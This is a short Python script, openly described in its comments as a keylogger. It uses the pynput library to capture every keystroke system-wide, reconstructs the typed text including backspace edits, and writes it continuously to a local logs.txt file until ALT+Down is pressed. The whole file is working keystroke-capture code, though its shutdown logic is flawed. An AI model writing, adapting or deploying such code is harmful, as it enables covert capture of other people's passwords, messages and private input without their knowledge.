from pynput.keyboard import Key, Listener
from threading import Thread, Event
import sys

# Keys to stop the keylogger (ALT + Down Arrow)
STOPCOMBO = {Key.alt_l, Key.down}  
CURRENT = set()
COUNT = True
KEYS = []  # List to store keystrokes

# Thread to run the keylogger
class MyThread(Thread):
    def __init__(self, event):
        Thread.__init__(self)
        self.stopped = event

    def run(self):
        begin()

# Starts listening for keystrokes
def begin():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Function to process key presses
def on_press(key):
    store(key)  # Store the key in the log file
    if key in STOPCOMBO:  
        CURRENT.add(key)
        if all(k in CURRENT for k in STOPCOMBO):  # If both ALT and Down Arrow are pressed
            close()  # Stop logging
            Listener.stop()

# Function to process key releases
def on_release(key):
    try:
        CURRENT.remove(key)
    except KeyError:
        pass

# Function to store keystrokes and handle backspace correctly
def store(key):
    global KEYS
    if key == Key.space:
        KEYS.append(" ")  # Store space as an actual space
    elif key == Key.backspace:
        if KEYS:
            KEYS.pop()  # Remove last typed character when backspace is pressed
    elif key == Key.enter:
        KEYS.append("\n")  # Store enter as a new line
    elif hasattr(key, 'char') and key.char is not None:
        KEYS.append(key.char)  # Store normal characters (letters, numbers, symbols)
    else:
        KEYS.append(f"[{key.name}]")  # Store special keys in brackets

    save_to_file()  # Save changes immediately

# Function to save keystrokes to a text file
def save_to_file():
    with open("logs.txt", "w") as file:  # "w" overwrites the file every time
        file.write("".join(KEYS))  # Write all stored keystrokes

# Function to stop the keylogger
def close():
    global COUNT
    COUNT = False
    sys.exit()

# Start the keylogger in a separate thread
thread = MyThread(Event())
thread.start()
